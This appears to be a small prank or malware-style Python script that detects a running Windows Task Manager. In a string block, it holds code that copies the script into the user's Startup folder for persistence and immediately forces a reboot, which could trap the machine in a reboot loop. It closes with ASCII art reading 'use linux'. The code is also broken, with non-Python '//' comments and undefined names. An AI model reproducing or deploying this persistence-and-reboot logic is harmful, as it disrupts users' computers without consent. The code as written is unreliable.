import os


def running():
    if os.system("tasklist /FI \"IMAGENAME eq taskmgr.exe\" 2>NUL | find /I /N \"taskmgr.exe\">NUL") == 0:
        return True
    return False


"""

if running():
    os.system(str("copy " + sys.argv[0] + " \"" + home +                                    //copy in autostart
            "/AppData\Roaming/Microsoft/Windows/Start Menu/Programs/Startup\""))
    os.system("shutdown -r -t 0")                                                          //reboot         


                          _   _                        
                         | | (_)                       
 _   _   ___    ___      | |  _   _ __    _   _  __  __
| | | | / __|  / _ \     | | | | | '_ \  | | | | \ \/ /
| |_| | \__ \ |  __/     | | | | | | | | | |_| |  >  < 
 \__,_| |___/  \___|     |_| |_| |_| |_|  \__,_| /_/\_\
                                                       

"""
